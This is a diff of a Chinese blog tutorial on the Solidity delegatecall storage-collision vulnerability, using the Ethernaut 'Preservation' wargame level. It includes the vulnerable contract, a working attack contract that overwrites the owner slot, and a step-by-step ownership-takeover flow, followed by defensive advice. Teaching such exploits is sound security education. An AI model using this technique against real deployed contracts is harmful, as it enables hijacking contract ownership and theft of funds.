@@ -16,15 +16,15 @@
   <meta name="author" content="Science_Jun">
   <meta name="keywords" content="区块链 深度学习">
   
-    <meta name="description" content="本篇文章是call注入攻击的姊妹篇，为啥这么说呢？ 因为委托调用攻击核心函数便是 delegatecall() 难度：偏难，但理解了就非常简单  📕1. 挑战 这是Ethernaut中的第十六个例子（已修改） 现在把需求交给你：将合约Preservation的所有权拿到手。 你会先想到什么？这个例子非常典型  123456789101112131415161718192021222324252">
+    <meta name="description" content="本篇文章是call注入攻击的姊妹篇，为啥这么说呢？ 因为委托调用攻击核心函数便是 delegatecall() 难度：偏难，但理解了就非常简单  📕1. 挑战？ 这是Ethernaut中的第十六个例子（已修改） 现在把需求交给你：将合约Preservation的所有权拿到手。 你会先想到什么？这个例子非常典型  12345678910111213141516171819202122232425">
 <meta property="og:type" content="article">
 <meta property="og:title" content="区块链骇客第五讲-委托调用攻击">
-<meta property="og:url" content="http://nangbowan.github.io/2022/11/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%BA%94%E8%AE%B2-%E5%A7%94%E6%89%98%E8%B0%83%E7%94%A8%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:url" content="http://nangbowan.github.io/2022/11/28/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%BA%94%E8%AE%B2-%E5%A7%94%E6%89%98%E8%B0%83%E7%94%A8%E6%94%BB%E5%87%BB/index.html">
 <meta property="og:site_name" content="77Brother">
-<meta property="og:description" content="本篇文章是call注入攻击的姊妹篇，为啥这么说呢？ 因为委托调用攻击核心函数便是 delegatecall() 难度：偏难，但理解了就非常简单  📕1. 挑战 这是Ethernaut中的第十六个例子（已修改） 现在把需求交给你：将合约Preservation的所有权拿到手。 你会先想到什么？这个例子非常典型  123456789101112131415161718192021222324252">
+<meta property="og:description" content="本篇文章是call注入攻击的姊妹篇，为啥这么说呢？ 因为委托调用攻击核心函数便是 delegatecall() 难度：偏难，但理解了就非常简单  📕1. 挑战？ 这是Ethernaut中的第十六个例子（已修改） 现在把需求交给你：将合约Preservation的所有权拿到手。 你会先想到什么？这个例子非常典型  12345678910111213141516171819202122232425">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-11-08T08:41:38.000Z">
-<meta property="article:modified_time" content="2022-11-26T08:01:01.080Z">
+<meta property="article:published_time" content="2022-11-28T08:41:38.000Z">
+<meta property="article:modified_time" content="2022-12-01T06:38:40.906Z">
 <meta property="article:author" content="Science_Jun">
 <meta property="article:tag" content="合约安全审计">
 <meta property="article:tag" content="delegatecall">
@@ -262,8 +262,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-08 16:41" pubdate>
-          2022年11月8日 下午
+        <time datetime="2022-11-28 16:41" pubdate>
+          2022年11月28日 下午
         </time>
       </span>
     
@@ -274,7 +274,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.2k 字
+          4.9k 字
         
       </span>
     
@@ -285,7 +285,7 @@
         
         
         
-          11 分钟
+          41 分钟
         
       </span>
     
@@ -341,7 +341,7 @@
 <p>因为委托调用攻击核心函数便是 delegatecall()</p>
 <p>难度：偏难，但理解了就非常简单</p>
 </blockquote>
-<h2 id="📕1-挑战"><a href="#📕1-挑战" class="headerlink" title="📕1. 挑战"></a>📕1. 挑战</h2><ul>
+<h2 id="📕1-挑战？"><a href="#📕1-挑战？" class="headerlink" title="📕1. 挑战？"></a>📕1. 挑战？</h2><ul>
 <li>这是<code>Ethernaut</code>中的第十六个例子（已修改）</li>
 <li><strong>现在把需求交给你</strong>：将合约<code>Preservation</code>的所有权拿到手。</li>
 <li>你会先想到什么？这个例子非常典型</li>
@@ -350,7 +350,87 @@
 
 
 
-<h2 id="🌳2-了解delegatecall"><a href="#🌳2-了解delegatecall" class="headerlink" title="🌳2.了解delegatecall ()"></a>🌳2.了解delegatecall ()</h2>
+<h2 id="📕2-了解delegatecall"><a href="#📕2-了解delegatecall" class="headerlink" title="📕2.了解delegatecall ()"></a>📕2.了解delegatecall ()</h2><p><code>delegatecall()</code>和<code>call()</code>是姊妹函数，它们都是调用函数的底层用法，因此在安全层面上是不严谨的。</p>
+<p>🌳官方文档是这么描述这个函数的：</p>
+<blockquote>
+<p>“除了目标地址上的代码在调用合约的上下文中执行以及 msg.sender 和 msg.value 不更改它们的值这一事实之外，与消息调用是相同的。</p>
+<p>这意味着合约可以在运行时从不同的地址动态加载代码。存储、当前地址和余额仍然是指调用合约，只有代码是从被调用的地址。”</p>
+</blockquote>
+<p><mark>官方文档写的太抽象，我来举个例子方便大家理解：</mark></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Example&#123;<br><br>    address public calledContract;<br>    <br>    constructor(address _calledContract)&#123;<br>       this.calledContract = _calledContract;<br>    &#125;<br>    <br>    function useDelegatecall(address _change) public &#123;<br>        calledContract.delegatecall(abi.encodePacked(bytes4(keccak256(&quot;changeAddress(address)&quot;)),_change))<br>    &#125;<br>&#125;<br><br><br>contract CalledContract&#123;<br>   address public initAddress;<br>   <br>   function changeAddress(address _changeAddress)&#123;<br>   		this.initAddress = _changeAddress;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="🚀解析例子"><a href="#🚀解析例子" class="headerlink" title="🚀解析例子"></a>🚀解析例子</h3><ul>
+<li><p><code>contract Example</code>：主合约</p>
+</li>
+<li><p><code>contract CalledContract</code>：被调用合约</p>
+</li>
+<li><p><code>address public calledContract</code>：被调用合约地址</p>
+</li>
+</ul>
+<blockquote>
+<p> 可以看到在函数<code>useDelegatecall</code>中，我们使用了<code>delegatecall()</code>调用了被调用合约的<code>changeAddress()</code>函数，并且传入了参数<code>_change</code>。</p>
+</blockquote>
+<p>调用成功后我们查看结果：</p>
+<blockquote>
+<p>被调用合约中的<code>initAddress</code>并未修改成传入的地址参数<code>_change</code>，反而主合约的<code>calledContract</code>变成了<code>_change</code>.</p>
+</blockquote>
+<h3 id="🎹离谱吗"><a href="#🎹离谱吗" class="headerlink" title="🎹离谱吗"></a>🎹离谱吗</h3><p>而这正是<code>delegatecall()</code>的安全漏洞：</p>
+<p><mark><strong>被调用合约的上下文仍然是主合约的上下文</strong></mark>，包括<code>msg.value</code>、<code>msg.sender</code> 以及 <code>storage</code>。因此当我们以为修改的是合约<code>CalledContract</code>的<mark>第一插槽</mark>（不了解插槽的去看上一讲）实际上我们修改的是合约<code>Example</code>的第一插槽，即<code>address calledContract</code>。</p>
+<p>这就是<code>delegatecall()</code>函数真正的妙处，同样也是极大的安全漏洞！</p>
+<hr>
+<h2 id="📕研究合约"><a href="#📕研究合约" class="headerlink" title="📕研究合约"></a>📕研究合约</h2><blockquote>
+<p>那么以上的使用方法，如何去破解开头给出的合约呢？</p>
+<p>我想聪明的你早就有了一些想法。</p>
+</blockquote>
+<h3 id="💎回到合约"><a href="#💎回到合约" class="headerlink" title="💎回到合约"></a>💎回到合约</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Preservation &#123;<br><br>  // public library contracts <br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  // Sets the function signature for delegatecall<br>  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;<br>    timeZone1Library = _timeZone1LibraryAddress; <br>    timeZone2Library = _timeZone2LibraryAddress; <br>    owner = msg.sender;<br>  &#125;<br> <br>  // set the time for timezone 1<br>  function setFirstTime(uint _timeStamp) public &#123;<br>    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br><br>  // set the time for timezone 2<br>  function setSecondTime(uint _timeStamp) public &#123;<br>    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br><br>  // stores a timestamp <br>  uint storedTime;  <br><br>  function setTime(uint _time) public &#123;<br>    storedTime = _time;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>Preservation</code>：主合约</li>
+<li><code>timeZone1Library</code>,<code>timeZone2Library</code>：两个外部调用合约地址，即本例中的<code>LibraryContract</code></li>
+<li><code>setTimeSignature</code>：函数签名，可以通过call或delegatecall等底层方法调用函数。</li>
+</ul>
+<h3 id="💎偷天换日"><a href="#💎偷天换日" class="headerlink" title="💎偷天换日"></a>💎偷天换日</h3><blockquote>
+<p>当调用主合约函数<code>setFirstTime</code>时，将会调用外部合约<code>LibraryContract</code>的<code>setTime</code>方法，在该方法中修改了此合约的<mark>第一插槽</mark>,根据<code>delegatecall()</code>的特性，真正被修改的其实是主合约的<mark>第一插槽！</mark>，即<code>timeZone1Library</code>.</p>
+</blockquote>
+<blockquote>
+<p>因此我们可以借助该漏洞替换掉主合约的<code>timeZone1Library</code>或者是<code>timeZone2Library</code>，再一次根据·<code>delegatecall()</code>的特性替换掉主合约的<code>owner</code>.</p>
+</blockquote>
+<h3 id="💎伪造攻击合约"><a href="#💎伪造攻击合约" class="headerlink" title="💎伪造攻击合约"></a>💎伪造攻击合约</h3><blockquote>
+<p>那么被我们替换掉的攻击合约应该是什么样的呢？</p>
+</blockquote>
+<p>为了完美利用<code>delegatecall()</code>的特性，它应该满足一下所有的需求：</p>
+<ul>
+<li>存储结构应该与主合约一致</li>
+<li>应该拥有与<code>setTime()</code>同名的函数</li>
+<li>应该在<code>setiTime()</code>函数中修改<mark>第三插槽</mark>的内存，也就是主合约中<code>owner</code>所在的存储位置。</li>
+</ul>
+<p>因此，这个合约应该长这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br><br>contract AttackPreservation &#123;<br><br>  //必须拥有相同的存储结构！<br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  <br>  <br>  //同名函数<br>  function setTime(uint _change) public &#123;<br>     owner = address(_change);<br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>至此，用于替换的攻击合约就已经编写好了。</p>
+<p>当调用该攻击合约的<code>setTime()</code>函数之时，我们将合约中owner（第三插槽）替换成了传入的变量。</p>
+<p>实际上修改的是主合约的<code>owner</code>变量，因此将调用传入的参数改成自己的钱包地址即可！</p>
+<h3 id="💎攻击流程"><a href="#💎攻击流程" class="headerlink" title="💎攻击流程"></a>💎攻击流程</h3><ol>
+<li>伪造用于替换<code>timeZone1Library</code>的攻击合约；</li>
+<li>首次调用<code>setFirstTime()</code>函数，将传入参数设为用于替换的攻击合约的地址；</li>
+<li>第二次调用<code>setFirstTime()</code>函数，将传入参数设为自己的钱包地址；</li>
+<li>完成攻击，将合约拥有者修改成了自己</li>
+</ol>
+<h2 id="📕总结"><a href="#📕总结" class="headerlink" title="📕总结"></a>📕总结</h2><blockquote>
+<p>delegatecall()是一种危险性极高的函数调用方式，因此在平时的合约编写中，非必要不要用到该调用方式。</p>
+<p>并且随着solidity语言版本的迭代更新，delegatecall()已经被逐步禁用。</p>
+<p>不要觉得这些知识学了无用，在今后的学习中，会基于这样的分析模式深入地解决问题！</p>
+</blockquote>
+<p>恭喜你！通过了这一章的学习。</p>
+<p>至此你已经初步了解了基于函数特性的技术性安全漏洞。</p>
+<p>在接下来的学习中，我会涉及到新型的合约攻击方式，请持续关注我！</p>
+<h3 id="🌳参考文献"><a href="#🌳参考文献" class="headerlink" title="🌳参考文献"></a>🌳参考文献</h3><p><a target="_blank" rel="noopener" href="https://blog.sigmaprime.io/solidity-security.html#delegatecall">blog.sigmaprime-delegatecall</a></p>
+<p><a target="_blank" rel="noopener" href="https://swcregistry.io/docs/SWC-112">SWC-112	</a></p>
+<p><a target="_blank" rel="noopener" href="https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-1-c33048d4d17d">How to Secure Your Smart Contracts: 6 Solidity Vulnerabilities and how to avoid them (Part 1)</a></p>
+<p><a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries">官方文档-delegatecall</a></p>
+
                 
               </div>
             
@@ -398,7 +478,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>区块链骇客第五讲-委托调用攻击</div>
-      <div>http://nangbowan.github.io/2022/11/08/区块链骇客第五讲-委托调用攻击/</div>
+      <div>http://nangbowan.github.io/2022/11/28/区块链骇客第五讲-委托调用攻击/</div>
     </div>
     <div class="license-meta">
       
@@ -410,7 +490,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年11月8日</div>
+          <div>2022年11月28日</div>
         </div>
       
       
@@ -440,18 +520,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/11/11/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-2/" title="狠人！用Python从零敲出一个以太坊虚拟机-2">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">狠人！用Python从零敲出一个以太坊虚拟机-2</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/11/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/" title="区块链安全威胁汇总">
-                        <span class="hidden-mobile">区块链安全威胁汇总</span>
+                      <a href="/2022/11/20/yarn%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/" title="">
+                        <span class="hidden-mobile"></span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
